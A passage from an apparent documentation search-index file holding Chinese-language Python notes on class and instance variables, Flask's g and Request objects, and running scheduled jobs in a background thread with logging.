\u88ab\u91cd\u65b0\u8d4b\u503c\u65f6\uff0c\u5b83\u7684\u503c\u5c31\u53d1\u751f\u4e86\u53d8\u5316\uff0c\u4f46\u7c7b\u53d8\u91cf\u7684\u503c\u4e0d\u4f1a\u968f\u4e4b\u53d8\u5316\u3002\u65b9\u6cd5\u5185\u7684\u5c40\u90e8\u53d8\u91cf\u4f1a\u5c4f\u853d\u6389\u7c7b\u53d8\u91cf\u548c\u5b9e\u4f8b\u53d8\u91cf\u3002\u7c7b\u53d8\u91cf\u662f\u6240\u6709\u5b9e\u4f8b\u5171\u4eab\u7684\uff0c\u800c\u5b9e\u4f8b\u53d8\u91cf\u53ea\u5c5e\u4e8e\u5bf9\u8c61\u81ea\u5df1\uff0c\u6bcf\u4e2a\u5b9e\u4f8b\u7684\u5b9e\u4f8b\u53d8\u91cf\u53ef\u4ee5\u6709\u4e0d\u540c\u7684\u503c\u3002","title":"self \u7b80\u4ecb"},{"location":"programming_language/python/basics/class/class_var/#_2","text":"1\u3001\u7c7b\u53d8\u91cf\u53ef\u4ee5\u7528 \u7c7b\u540d.\u7c7b\u53d8\u91cf \u548c self.\u7c7b\u53d8\u91cf \u4e24\u79cd\u65b9\u5f0f\u8bbf\u95ee\uff0c\u540e\u8005\u4e00\u822c\u60c5\u51b5\u4e0d\u5efa\u8bae\u4f7f\u7528\u3002 2\u3001\u7c7b\u53d8\u91cf\u662f\u6240\u6709\u5bf9\u8c61\u6240\u5171\u4eab\u7684\uff0c\u65e0\u8bba\u4efb\u4f55\u65f6\u5019\u90fd\u5efa\u8bae\u7528\u7c7b\u540d\u7684\u65b9\u5f0f\u8bbf\u95ee\u7c7b\u53d8\u91cf\u3002 3\u3001\u5b9e\u4f8b\u53d8\u91cf\u5728\u7c7b\u5185\u90e8\u7528 self \u8bbf\u95ee\uff0c\u5728\u7c7b\u5916\u90e8\u7528\u5b9e\u4f8b\u540d\u8bbf\u95ee\u3002 4\u3001\u7c7b\u53d8\u91cf\u901a\u8fc7 self \u8bbf\u95ee\u65f6\u5219\u88ab\u8f6c\u5316\u4e3a\u5b9e\u4f8b\u53d8\u91cf\uff0c\u88ab\u7ed1\u5b9a\u5230\u7279\u5b9a\u7684\u5b9e\u4f8b\u4e0a\uff0c\u5176\u503c\u4f1a\u5c4f\u853d\u6389\u7c7b\u53d8\u91cf\u3002 5\u3001\u901a\u8fc7\u5bf9\u5b9e\u4f8b\u53d8\u91cf\uff08self\uff09\u7684\u5f62\u5f0f\u5bf9\u7c7b\u53d8\u91cf\u91cd\u65b0\u8d4b\u503c\u540e\uff0c\u7c7b\u53d8\u91cf\u7684\u503c\u4e0d\u968f\u4e4b\u53d8\u5316\u3002 6\u3001\u65b9\u6cd5\u5185\u7684\u5c40\u90e8\u53d8\u91cf\u4f1a\u5c4f\u853d\u6389\u7c7b\u53d8\u91cf\u548c\u5b9e\u4f8b\u53d8\u91cf\u3002 7\u3001\u540c\u4e00\u5b9e\u4f8b\u53d8\u91cf\u5728\u4e0d\u540c\u7684\u5b9e\u4f8b\u4e2d\u53ef\u80fd\u62e5\u6709\u4e0d\u540c\u7684\u503c\u3002 http://kuanghy.github.io/2015/12/19/python-variable \u5b98\u65b9\u5bf9\u4e8eself\u7684\u8bb2\u89e3 \u7f16\u7a0b\u5e38\u89c1\u95ee\u9898 \u2014 Python 3.9.12 \u6587\u6863","title":"\u8981\u70b9\u603b\u7ed3"},{"location":"programming_language/python/flask/flask_init/","text":"Flask\u6846\u67b6 \u4e00\u4e2a\u57fa\u4e8epython\u7684\uff0c\u7b80\u5355\u5feb\u901f\u7684WEB\u6846\u67b6 GitHub\u5730\u5740\uff1ahttps://github.com/pallets/flask \u5b98\u65b9\u6587\u6863\uff1ahttps://flask.palletsprojects.com/en/2.0.x/ Flask g \u5bf9\u8c61 1.\u4ec0\u4e48\u662fg\u5bf9\u8c61\u3002 1.\u5728flask\u4e2d\uff0c\u6709\u4e00\u4e2a\u4e13\u95e8\u7528\u6765\u5b58\u50a8\u7528\u6237\u4fe1\u606f\u7684g\u5bf9\u8c61\uff0cg\u7684\u5168\u79f0\u7684\u4e3aglobal\u3002 2.g\u5bf9\u8c61\u5728\u4e00\u6b21\u8bf7\u6c42\u4e2d\u7684\u6240\u6709\u7684\u4ee3\u7801\u7684\u5730\u65b9\uff0c\u90fd\u662f\u53ef\u4ee5\u4f7f\u7528\u7684\u3002 2.g\u5bf9\u8c61\u548csession\u7684\u533a\u522b \u5728\u6211\u770b\u6765\uff0c\u6700\u5927\u7684\u533a\u522b\u662f\uff0csession\u5bf9\u8c61\u662f\u53ef\u4ee5\u8de8request\u7684\uff0c\u53ea\u8981session\u8fd8\u672a\u5931\u6548\uff0c\u4e0d\u540c\u7684request\u7684\u8bf7\u6c42\u4f1a\u83b7\u53d6\u5230\u540c\u4e00\u4e2asession\uff0c\u4f46\u662fg\u5bf9\u8c61\u4e0d\u662f\uff0cg\u5bf9\u8c61\u4e0d\u9700\u8981\u7ba1\u8fc7\u671f\u65f6\u95f4\uff0c\u8bf7\u6c42\u4e00\u6b21\u5c31g\u5bf9\u8c61\u5c31\u6539\u53d8\u4e86\u4e00\u6b21\uff0c\u6216\u8005\u91cd\u65b0\u8d4b\u503c\u4e86\u4e00\u6b21 \u4e5f\u5c31\u662fsession\u53ef\u4ee5\u5728\u6211\u4eec\u7684\u8fd9\u4e2a\u7f51\u7ad9\u968f\u610f\u90fd\u53ef\u4ee5\u7528 \u800c g\u53ea\u80fd\u662f\u8fd9\u6b21\u7684\u8bf7\u6c42\u5982\u679c\u91cd\u5b9a\u5411\u4e4b\u540e\u5c31\u4f1a\u6539\u53d8 flask_g.py from flask import Flask, g, request from util import login_log app = Flask(__name__) @app.route('/login/', methods=['GET', 'POST']) def login(): username = request.args.get('username') if username == 'key': g.username = username login_log() return '\u606d\u559c\u60a8\uff01\u767b\u5f55\u6210\u529f' else: return '\u767b\u5f55\u540d\u6216\u5bc6\u7801\u9519\u8bef!' if __name__ == '__main__': app.run() util.py from flask import g def login_log(): print('\u767b\u5f55\u540d\u4e3a: {}'.format(g.username)) \u542f\u52a8flask_g.py \u6d4f\u89c8\u5668\u8bbf\u95ee http://127.0.0.1:5000/login/?username=key \u63a7\u5236\u53f0\u8f93\u51fa \u767b\u5f55\u540d\u4e3a: key g\u5bf9\u8c61\u7684\u4f7f\u7528\u6848\u4f8b\uff1ahttps://vimsky.com/examples/detail/python-method-flask.g.html Flask Request\u5bf9\u8c61 \u6765\u81ea\u5ba2\u6237\u7aef\u7f51\u9875\u7684\u6570\u636e\u4f5c\u4e3a\u5168\u5c40\u8bf7\u6c42\u5bf9\u8c61\u53d1\u9001\u5230\u670d\u52a1\u5668\u3002\u4e3a\u4e86\u5904\u7406\u8bf7\u6c42\u6570\u636e\uff0c\u5e94\u8be5\u4eceFlask\u6a21\u5757\u5bfc\u5165\u3002 Request\u5bf9\u8c61\u7684\u91cd\u8981\u5c5e\u6027\u5982\u4e0b\u6240\u5217\uff1a Form - \u5b83\u662f\u4e00\u4e2a\u5b57\u5178\u5bf9\u8c61\uff0c\u5305\u542b\u8868\u5355\u53c2\u6570\u53ca\u5176\u503c\u7684\u952e\u548c\u503c\u5bf9\u3002 args - \u89e3\u6790\u67e5\u8be2\u5b57\u7b26\u4e32\u7684\u5185\u5bb9\uff0c\u5b83\u662f\u95ee\u53f7\uff08\uff1f\uff09\u4e4b\u540e\u7684URL\u7684\u4e00\u90e8\u5206\u3002 Cookies - \u4fdd\u5b58Cookie\u540d\u79f0\u548c\u503c\u7684\u5b57\u5178\u5bf9\u8c61\u3002 files - \u4e0e\u4e0a\u4f20\u6587\u4ef6\u6709\u5173\u7684\u6570\u636e\u3002 method - \u5f53\u524d\u8bf7\u6c42\u65b9\u6cd5\u3002 \u5c5e\u6027\u540d \u89e3\u91ca form \u4e00\u4e2a\u4ecePOST\u548cPUT\u8bf7\u6c42\u89e3\u6790\u7684 MultiDict\uff08\u4e00\u952e\u591a\u503c\u5b57\u5178\uff09\u3002 args MultiDict\uff0c\u8981\u64cd\u4f5c URL \uff08\u5982 ?key=value \uff09\u4e2d\u63d0\u4ea4\u7684\u53c2\u6570\u53ef\u4ee5\u4f7f\u7528 args \u5c5e\u6027:searchword = request.args.get('key', '') values CombinedMultiDict\uff0c\u5185\u5bb9\u662fform\u548cargs\u3002 \u53ef\u4ee5\u4f7f\u7528values\u66ff\u4ee3form\u548cargs\u3002 cookies \u8bf7\u6c42\u7684cookies\uff0c\u7c7b\u578b\u662fdict\u3002 stream \u5728\u53ef\u77e5\u7684mimetype\u4e0b\uff0c\u5982\u679c\u8fdb\u6765\u7684\u8868\u5355\u6570\u636e\u65e0\u6cd5\u89e3\u7801\uff0c\u4f1a\u6ca1\u6709\u4efb\u4f55\u6539\u52a8\u7684\u4fdd\u5b58\u5230\u8fd9\u4e2a stream \u4ee5\u4f9b\u4f7f\u7528\u3002\u5f88\u591a\u65f6\u5019\uff0c\u5f53\u8bf7\u6c42\u7684\u6570\u636e\u8f6c\u6362\u4e3astring\u65f6\uff0c\u4f7f\u7528data\u662f\u6700\u597d\u7684\u65b9\u5f0f\u3002\u8fd9\u4e2astream\u53ea\u8fd4\u56de\u6570\u636e\u4e00\u6b21\u3002 headers \u8bf7\u6c42\u5934\uff0c\u5b57\u5178\u7c7b\u578b\u3002 data \u5305\u542b\u4e86\u8bf7\u6c42\u7684\u6570\u636e\uff0c\u5e76\u8f6c\u6362\u4e3a\u5b57\u7b26\u4e32\uff0c\u9664\u975e\u662f\u4e00\u4e2aFlask\u65e0\u6cd5\u5904\u7406\u7684mimetype\u3002 files MultiDict\uff0c\u5e26\u6709\u901a\u8fc7POST\u6216PUT\u8bf7\u6c42\u4e0a\u4f20\u7684\u6587\u4ef6\u3002 environ WSGI\u9690\u542b\u7684\u73af\u5883\u914d\u7f6e\u3002 method \u8bf7\u6c42\u65b9\u6cd5\uff0c\u6bd4\u5982POST\u3001GET\u3002 path \u83b7\u53d6\u8bf7\u6c42\u6587\u4ef6\u8def\u5f84\uff1a/myapplication/page.html base_url \u83b7\u53d6\u57df\u540d\u4e0e\u8bf7\u6c42\u6587\u4ef6\u8def\u5f84\uff1ahttp://www.baidu.com/myapplication/page.html url \u83b7\u53d6\u5168\u90e8url\uff1ahttp://www.baidu.com/myapplication/page.html?id=1&edit=edit url_root \u83b7\u53d6\u57df\u540d\uff1ahttp://www.baidu.com/ is_xhr \u5982\u679c\u8bf7\u6c42\u662f\u4e00\u4e2a\u6765\u81eaJavaScript XMLHttpRequest\u7684\u89e6\u53d1\uff0c\u5219\u8fd4\u56deTrue\uff0c\u8fd9\u4e2a\u53ea\u5de5\u4f5c\u5728\u652f\u6301X-Requested-With\u5934\u7684\u5e93\u5e76\u4e14\u8bbe\u7f6e\u4e86XMLHttpRequest\u3002 blueprint \u84dd\u56fe\u540d\u5b57\u3002 endpoint endpoint\u5339\u914d\u8bf7\u6c42\uff0c\u8fd9\u4e2a\u4e0eview_args\u76f8\u7ed3\u5408\uff0c\u53ef\u662f\u7528\u4e8e\u91cd\u6784\u76f8\u540c\u6216\u4fee\u6539URL\u3002\u5f53\u5339\u914d\u7684\u65f6\u5019\u53d1\u751f\u5f02\u5e38\uff0c\u4f1a\u8fd4\u56deNone\u3002 json \u5982\u679cmimetype\u662fapplication/json\uff0c\u8fd9\u4e2a\u53c2\u6570\u5c06\u4f1a\u89e3\u6790JSON\u6570\u636e\uff0c\u5982\u679c\u4e0d\u662f\u5219\u8fd4\u56deNone\u3002 \u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e2a\u66ff\u4ee3get_json()\u65b9\u6cd5\u3002 max_content_length \u53ea\u8bfb\uff0c\u8fd4\u56deMAX_CONTENT_LENGTH\u7684\u914d\u7f6e\u952e\u3002 module \u5982\u679c\u8bf7\u6c42\u662f\u53d1\u9001\u5230\u4e00\u4e2a\u5b9e\u9645\u7684\u6a21\u5757\uff0c\u5219\u8be5\u53c2\u6570\u8fd4\u56de\u5f53\u524d\u6a21\u5757\u7684\u540d\u79f0\u3002\u8fd9\u662f\u5f03\u7528\u7684\u529f\u80fd\uff0c\u4f7f\u7528blueprints\u66ff\u4ee3\u3002 routing_exception = None \u5982\u679c\u5339\u914dURL\u5931\u8d25\uff0c\u8fd9\u4e2a\u5f02\u5e38\u5c06\u4f1a/\u5df2\u7ecf\u629b\u51fa\u4f5c\u4e3a\u8bf7\u6c42\u5904\u7406\u7684\u4e00\u90e8\u5206\u3002\u8fd9\u901a\u5e38\u7528\u4e8eNotFound\u5f02\u5e38\u6216\u7c7b\u4f3c\u7684\u60c5\u51b5\u3002 Flask Response\u5bf9\u8c61 https://blog.csdn.net/qq_42666483/article/details/82526765","title":"Flask"},{"location":"programming_language/python/flask/flask_init/#flask","text":"\u4e00\u4e2a\u57fa\u4e8epython\u7684\uff0c\u7b80\u5355\u5feb\u901f\u7684WEB\u6846\u67b6 GitHub\u5730\u5740\uff1ahttps://github.com/pallets/flask \u5b98\u65b9\u6587\u6863\uff1ahttps://flask.palletsprojects.com/en/2.0.x/","title":"Flask\u6846\u67b6"},{"location":"programming_language/python/flask/flask_init/#flask-g","text":"","title":"Flask g \u5bf9\u8c61"},{"location":"programming_language/python/flask/flask_init/#1g","text":"1.\u5728flask\u4e2d\uff0c\u6709\u4e00\u4e2a\u4e13\u95e8\u7528\u6765\u5b58\u50a8\u7528\u6237\u4fe1\u606f\u7684g\u5bf9\u8c61\uff0cg\u7684\u5168\u79f0\u7684\u4e3aglobal\u3002 2.g\u5bf9\u8c61\u5728\u4e00\u6b21\u8bf7\u6c42\u4e2d\u7684\u6240\u6709\u7684\u4ee3\u7801\u7684\u5730\u65b9\uff0c\u90fd\u662f\u53ef\u4ee5\u4f7f\u7528\u7684\u3002","title":"1.\u4ec0\u4e48\u662fg\u5bf9\u8c61\u3002"},{"location":"programming_language/python/flask/flask_init/#2gsession","text":"\u5728\u6211\u770b\u6765\uff0c\u6700\u5927\u7684\u533a\u522b\u662f\uff0csession\u5bf9\u8c61\u662f\u53ef\u4ee5\u8de8request\u7684\uff0c\u53ea\u8981session\u8fd8\u672a\u5931\u6548\uff0c\u4e0d\u540c\u7684request\u7684\u8bf7\u6c42\u4f1a\u83b7\u53d6\u5230\u540c\u4e00\u4e2asession\uff0c\u4f46\u662fg\u5bf9\u8c61\u4e0d\u662f\uff0cg\u5bf9\u8c61\u4e0d\u9700\u8981\u7ba1\u8fc7\u671f\u65f6\u95f4\uff0c\u8bf7\u6c42\u4e00\u6b21\u5c31g\u5bf9\u8c61\u5c31\u6539\u53d8\u4e86\u4e00\u6b21\uff0c\u6216\u8005\u91cd\u65b0\u8d4b\u503c\u4e86\u4e00\u6b21 \u4e5f\u5c31\u662fsession\u53ef\u4ee5\u5728\u6211\u4eec\u7684\u8fd9\u4e2a\u7f51\u7ad9\u968f\u610f\u90fd\u53ef\u4ee5\u7528 \u800c g\u53ea\u80fd\u662f\u8fd9\u6b21\u7684\u8bf7\u6c42\u5982\u679c\u91cd\u5b9a\u5411\u4e4b\u540e\u5c31\u4f1a\u6539\u53d8 flask_g.py from flask import Flask, g, request from util import login_log app = Flask(__name__) @app.route('/login/', methods=['GET', 'POST']) def login(): username = request.args.get('username') if username == 'key': g.username = username login_log() return '\u606d\u559c\u60a8\uff01\u767b\u5f55\u6210\u529f' else: return '\u767b\u5f55\u540d\u6216\u5bc6\u7801\u9519\u8bef!' if __name__ == '__main__': app.run() util.py from flask import g def login_log(): print('\u767b\u5f55\u540d\u4e3a: {}'.format(g.username)) \u542f\u52a8flask_g.py \u6d4f\u89c8\u5668\u8bbf\u95ee http://127.0.0.1:5000/login/?username=key \u63a7\u5236\u53f0\u8f93\u51fa \u767b\u5f55\u540d\u4e3a: key g\u5bf9\u8c61\u7684\u4f7f\u7528\u6848\u4f8b\uff1ahttps://vimsky.com/examples/detail/python-method-flask.g.html","title":"2.g\u5bf9\u8c61\u548csession\u7684\u533a\u522b"},{"location":"programming_language/python/flask/flask_init/#flask-request","text":"\u6765\u81ea\u5ba2\u6237\u7aef\u7f51\u9875\u7684\u6570\u636e\u4f5c\u4e3a\u5168\u5c40\u8bf7\u6c42\u5bf9\u8c61\u53d1\u9001\u5230\u670d\u52a1\u5668\u3002\u4e3a\u4e86\u5904\u7406\u8bf7\u6c42\u6570\u636e\uff0c\u5e94\u8be5\u4eceFlask\u6a21\u5757\u5bfc\u5165\u3002 Request\u5bf9\u8c61\u7684\u91cd\u8981\u5c5e\u6027\u5982\u4e0b\u6240\u5217\uff1a Form - \u5b83\u662f\u4e00\u4e2a\u5b57\u5178\u5bf9\u8c61\uff0c\u5305\u542b\u8868\u5355\u53c2\u6570\u53ca\u5176\u503c\u7684\u952e\u548c\u503c\u5bf9\u3002 args - \u89e3\u6790\u67e5\u8be2\u5b57\u7b26\u4e32\u7684\u5185\u5bb9\uff0c\u5b83\u662f\u95ee\u53f7\uff08\uff1f\uff09\u4e4b\u540e\u7684URL\u7684\u4e00\u90e8\u5206\u3002 Cookies - \u4fdd\u5b58Cookie\u540d\u79f0\u548c\u503c\u7684\u5b57\u5178\u5bf9\u8c61\u3002 files - \u4e0e\u4e0a\u4f20\u6587\u4ef6\u6709\u5173\u7684\u6570\u636e\u3002 method - \u5f53\u524d\u8bf7\u6c42\u65b9\u6cd5\u3002 \u5c5e\u6027\u540d \u89e3\u91ca form \u4e00\u4e2a\u4ecePOST\u548cPUT\u8bf7\u6c42\u89e3\u6790\u7684 MultiDict\uff08\u4e00\u952e\u591a\u503c\u5b57\u5178\uff09\u3002 args MultiDict\uff0c\u8981\u64cd\u4f5c URL \uff08\u5982 ?key=value \uff09\u4e2d\u63d0\u4ea4\u7684\u53c2\u6570\u53ef\u4ee5\u4f7f\u7528 args \u5c5e\u6027:searchword = request.args.get('key', '') values CombinedMultiDict\uff0c\u5185\u5bb9\u662fform\u548cargs\u3002 \u53ef\u4ee5\u4f7f\u7528values\u66ff\u4ee3form\u548cargs\u3002 cookies \u8bf7\u6c42\u7684cookies\uff0c\u7c7b\u578b\u662fdict\u3002 stream \u5728\u53ef\u77e5\u7684mimetype\u4e0b\uff0c\u5982\u679c\u8fdb\u6765\u7684\u8868\u5355\u6570\u636e\u65e0\u6cd5\u89e3\u7801\uff0c\u4f1a\u6ca1\u6709\u4efb\u4f55\u6539\u52a8\u7684\u4fdd\u5b58\u5230\u8fd9\u4e2a stream \u4ee5\u4f9b\u4f7f\u7528\u3002\u5f88\u591a\u65f6\u5019\uff0c\u5f53\u8bf7\u6c42\u7684\u6570\u636e\u8f6c\u6362\u4e3astring\u65f6\uff0c\u4f7f\u7528data\u662f\u6700\u597d\u7684\u65b9\u5f0f\u3002\u8fd9\u4e2astream\u53ea\u8fd4\u56de\u6570\u636e\u4e00\u6b21\u3002 headers \u8bf7\u6c42\u5934\uff0c\u5b57\u5178\u7c7b\u578b\u3002 data \u5305\u542b\u4e86\u8bf7\u6c42\u7684\u6570\u636e\uff0c\u5e76\u8f6c\u6362\u4e3a\u5b57\u7b26\u4e32\uff0c\u9664\u975e\u662f\u4e00\u4e2aFlask\u65e0\u6cd5\u5904\u7406\u7684mimetype\u3002 files MultiDict\uff0c\u5e26\u6709\u901a\u8fc7POST\u6216PUT\u8bf7\u6c42\u4e0a\u4f20\u7684\u6587\u4ef6\u3002 environ WSGI\u9690\u542b\u7684\u73af\u5883\u914d\u7f6e\u3002 method \u8bf7\u6c42\u65b9\u6cd5\uff0c\u6bd4\u5982POST\u3001GET\u3002 path \u83b7\u53d6\u8bf7\u6c42\u6587\u4ef6\u8def\u5f84\uff1a/myapplication/page.html base_url \u83b7\u53d6\u57df\u540d\u4e0e\u8bf7\u6c42\u6587\u4ef6\u8def\u5f84\uff1ahttp://www.baidu.com/myapplication/page.html url \u83b7\u53d6\u5168\u90e8url\uff1ahttp://www.baidu.com/myapplication/page.html?id=1&edit=edit url_root \u83b7\u53d6\u57df\u540d\uff1ahttp://www.baidu.com/ is_xhr \u5982\u679c\u8bf7\u6c42\u662f\u4e00\u4e2a\u6765\u81eaJavaScript XMLHttpRequest\u7684\u89e6\u53d1\uff0c\u5219\u8fd4\u56deTrue\uff0c\u8fd9\u4e2a\u53ea\u5de5\u4f5c\u5728\u652f\u6301X-Requested-With\u5934\u7684\u5e93\u5e76\u4e14\u8bbe\u7f6e\u4e86XMLHttpRequest\u3002 blueprint \u84dd\u56fe\u540d\u5b57\u3002 endpoint endpoint\u5339\u914d\u8bf7\u6c42\uff0c\u8fd9\u4e2a\u4e0eview_args\u76f8\u7ed3\u5408\uff0c\u53ef\u662f\u7528\u4e8e\u91cd\u6784\u76f8\u540c\u6216\u4fee\u6539URL\u3002\u5f53\u5339\u914d\u7684\u65f6\u5019\u53d1\u751f\u5f02\u5e38\uff0c\u4f1a\u8fd4\u56deNone\u3002 json \u5982\u679cmimetype\u662fapplication/json\uff0c\u8fd9\u4e2a\u53c2\u6570\u5c06\u4f1a\u89e3\u6790JSON\u6570\u636e\uff0c\u5982\u679c\u4e0d\u662f\u5219\u8fd4\u56deNone\u3002 \u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e2a\u66ff\u4ee3get_json()\u65b9\u6cd5\u3002 max_content_length \u53ea\u8bfb\uff0c\u8fd4\u56deMAX_CONTENT_LENGTH\u7684\u914d\u7f6e\u952e\u3002 module \u5982\u679c\u8bf7\u6c42\u662f\u53d1\u9001\u5230\u4e00\u4e2a\u5b9e\u9645\u7684\u6a21\u5757\uff0c\u5219\u8be5\u53c2\u6570\u8fd4\u56de\u5f53\u524d\u6a21\u5757\u7684\u540d\u79f0\u3002\u8fd9\u662f\u5f03\u7528\u7684\u529f\u80fd\uff0c\u4f7f\u7528blueprints\u66ff\u4ee3\u3002 routing_exception = None \u5982\u679c\u5339\u914dURL\u5931\u8d25\uff0c\u8fd9\u4e2a\u5f02\u5e38\u5c06\u4f1a/\u5df2\u7ecf\u629b\u51fa\u4f5c\u4e3a\u8bf7\u6c42\u5904\u7406\u7684\u4e00\u90e8\u5206\u3002\u8fd9\u901a\u5e38\u7528\u4e8eNotFound\u5f02\u5e38\u6216\u7c7b\u4f3c\u7684\u60c5\u51b5\u3002","title":"Flask Request\u5bf9\u8c61"},{"location":"programming_language/python/flask/flask_init/#flask-response","text":"https://blog.csdn.net/qq_42666483/article/details/82526765","title":"Flask Response\u5bf9\u8c61"},{"location":"programming_language/python/shedule/run_in_back/","text":"shedule\u6a21\u5757 \u8ba9\u4efb\u52a1\u5728\u540e\u53f0\u8fd0\u884c https://schedule.readthedocs.io/en/stable/background-execution.html import threading import time import schedule def run_continuously(interval=1): \"\"\"Continuously run, while executing pending jobs at each elapsed time interval. @return cease_continuous_run: threading. Event which can be set to cease continuous run. Please note that it is *intended behavior that run_continuously() does not run missed jobs*. For example, if you've registered a job that should run every minute and you set a continuous run interval of one hour then your job won't be run 60 times at each interval but only once. \"\"\" cease_continuous_run = threading.Event() class ScheduleThread(threading.Thread): @classmethod def run(cls): while not cease_continuous_run.is_set(): schedule.run_pending() time.sleep(interval) continuous_thread = ScheduleThread() continuous_thread.start() return cease_continuous_run def background_job(): print('Hello from the background thread') schedule.every().second.do(background_job) # Start the background thread stop_run_continuously = run_continuously() # Do some other things... time.sleep(10) # Stop the background thread stop_run_continuously.set()","title":"\u540e\u53f0\u6267\u884c"},{"location":"programming_language/python/shedule/run_in_back/#shedule","text":"\u8ba9\u4efb\u52a1\u5728\u540e\u53f0\u8fd0\u884c https://schedule.readthedocs.io/en/stable/background-execution.html import threading import time import schedule def run_continuously(interval=1): \"\"\"Continuously run, while executing pending jobs at each elapsed time interval. @return cease_continuous_run: threading. Event which can be set to cease continuous run. Please note that it is *intended behavior that run_continuously() does not run missed jobs*. For example, if you've registered a job that should run every minute and you set a continuous run interval of one hour then your job won't be run 60 times at each interval but only once. \"\"\" cease_continuous_run = threading.Event() class ScheduleThread(threading.Thread): @classmethod def run(cls): while not cease_continuous_run.is_set(): schedule.run_pending() time.sleep(interval) continuous_thread = ScheduleThread() continuous_thread.start() return cease_continuous_run def background_job(): print('Hello from the background thread') schedule.every().second.do(background_job) # Start the background thread stop_run_continuously = run_continuously() # Do some other things... time.sleep(10) # Stop the background thread stop_run_continuously.set()","title":"shedule\u6a21\u5757"},{"location":"programming_language/python/shedule/see_cron/","text":"schedule \u65e5\u5fd7\u663e\u793a\u4e0b\u6b21\u4efb\u52a1\u6267\u884c\u65f6\u95f4 https://schedule.readthedocs.io/en/stable/examples.html schedule\u8fdb\u884c\u5b9a\u65f6\u4efb\u52a1\u7ba1\u7406\u975e\u5e38\u597d\u7528\uff0c\u901a\u8fc7 get_jobs \u65b9\u6cd5\u53ef\u4ee5\u83b7\u53d6\u5f53\u524d\u7684\u5b9a\u65f6\u4efb\u52a1\u8be6\u60c5\uff0c\u53ef\u4ee5\u5728\u5b50\u7ebf\u7a0b\u4e2d\uff0c\u4e0d\u65ad\u6253\u5370\u5b9a\u65f6\u4efb\u52a1\u7684\u8be6\u60c5 import schedule import threading import time import colorlog import logging.handlers import sys # \u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u65e5\u5fd7\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014 logfilename = \"learn_schedule_catch.log\" log_colors_config = { 'DEBUG': 'white', 'INFO': 'green', 'WARNING': 'yellow', 'ERROR': 'red', 'CRITICAL': 'bold_red', } logger = logging.getLogger(__name__) logger.setLevel(level=logging.DEBUG) # \u8bbe\u7f6e\u65e5\u5fd7\u6587\u4ef6 handler = logging.handlers.RotatingFileHandler(logfilename, encoding='utf-8', maxBytes=100 * 1024 * 1024, backupCount=10) # \u8f93\u51fa\u5230\u6587\u4ef6\u7684\u65e5\u5fd7\u7ea7\u522b handler.setLevel(logging.INFO) # \u65e5\u5fd7\u6837\u5f0f formatter = logging.Formatter( '%(asctime)s-%(name)s-%(filename)s-[line:%(lineno)d]-%(levelname)s-[\u65e5\u5fd7\u4fe1\u606f]: %(message)s') # \u63a7\u5236\u53f0\u65e5\u5fd7\u6837\u5f0f formatter_color = colorlog.ColoredFormatter( '%(log_color)s%(asctime)s-%(name)s-%(filename)s-[line:%(lineno)d]-%(levelname)s-[\u65e5\u5fd7\u4fe1\u606f]: %(message)s', log_colors=log_colors_config) # \u63a7\u5236\u53f0\u7684\u65e5\u5fd7 console = logging.StreamHandler(stream=sys.stdout) # \u63a7\u5236\u53f0\u7684\u65e5\u5fd7\u7ea7\u522b console.setLevel(logging.DEBUG) # \u8bbe\u7f6e\u65e5\u5fd7\u6837\u5f0f handler.setFormatter(formatter) console.setFormatter(formatter_color) logger.addHandler(handler) logger.addHandler(console) #\u9700\u8981\u5b9a\u65f6\u6267\u884c\u7684\u4efb\u52a1 def job(): logger.info(\"I'm working...\") #\u8bbe\u7f6e\u4e3a1\u5206\u949f\u4e00\u6b21 schedule.every(1).minute.do(job) #\u67e5\u770b\u4efb\u52a1\u6267\u884c\u65f6\u95f4\u7684\u65b9\u6cd5\uff0c\u6b7b\u5faa\u73af def see_cron(): while True: time.sleep(10) all_jobs = schedule.get_jobs() logger.info(all_jobs) #\u540e\u53f0\u6267\u884csee_cron t1 = threading.Thread(target=see_cron) #\u8ba9\u8fd9\u4e2a\u4efb\u52a1\u968f\u4e3b\u7ebf\u7a0b\u9000\u51fa\u800c\u9000\u51fa t1.setDaemon(True) t1.start() #\u6253\u5f00\u5b9a\u65f6\u4efb\u52a1\u8fdb\u7a0b while True: schedule.run_pending() time.sleep(1) \u7ed3\u679c\uff1a 2021-11-10 16:25:45,195-__main__-learn_schedule_catch.py-[line:56]-INFO-[\u65e5\u5fd7\u4fe1\u606f]: [Every 1 minute do job() (last run: [never], next run: 2021-11-10 16:26:15)] 2021-11-10 16:25:55,198-__main__-learn_schedule_catch.py-[line:56]-INFO-[\u65e5\u5fd7\u4fe1\u606f]: [Every 1 minute do job() (last run: [never], next run: 2021-11-10 16:26:15)] 2021-11-10 16:26:05,206-__main__-learn_schedule_catch.py-[line:56]-INFO-[\u65e5\u5fd7\u4fe1\u606f]: [Every 1 minute do job() (last run: [never], next run: 2021-11-10 16:26:15)] 2021-11-10 16:26:15,209-__main__-learn_schedule_catch.py-[line:56]-INFO-[\u65e5\u5fd7\u4fe1\u606f]: [Every 1 minute do job() (last run: [never], next run: 2021-11-10 16:26:15)] 2021-11-10 16:26:15,261-__main__-learn_schedule_catch.py-[line:44]-INFO-[\u65e5\u5fd7\u4fe1\u606f]: I'm working...","title":"schedule\u65e5\u5fd7\u663e\u793a\u4e0b\u6b21\u4efb\u52a1\u6267\u884c\u65f6\u95f4"},{"location":"programming_language/python/shedule/see_cron/#schedule","text":"https://schedule.readthedocs.io/en/stable/examples.html schedule\u8fdb\u884c\u5b9a\u65f6\u4efb\u52a1\u7ba1\u7406\u975e\u5e38\u597d\u7528\uff0c\u901a\u8fc7 get_jobs \u65b9\u6cd5\u53ef\u4ee5\u83b7\u53d6\u5f53\u524d\u7684\u5b9a\u65f6\u4efb\u52a1\u8be6\u60c5\uff0c\u53ef\u4ee5\u5728\u5b50\u7ebf\u7a0b\u4e2d\uff0c\u4e0d\u65ad\u6253\u5370\u5b9a\u65f6\u4efb\u52a1\u7684\u8be6\u60c5 import schedule import threading import time import colorlog import logging.handlers import sys # \u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u65e5\u5fd7\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014 logfilename = \"learn_schedule_catch.log\" log_colors_config = { 'DEBUG': 'white', 'INFO': 'green', 'WARNING': 'yellow', 'ERROR': 'red', 'CRITICAL': 'bold_red', } logger = logging.getLogger(__name__) logger.setLevel(level=logging.DEBUG) # 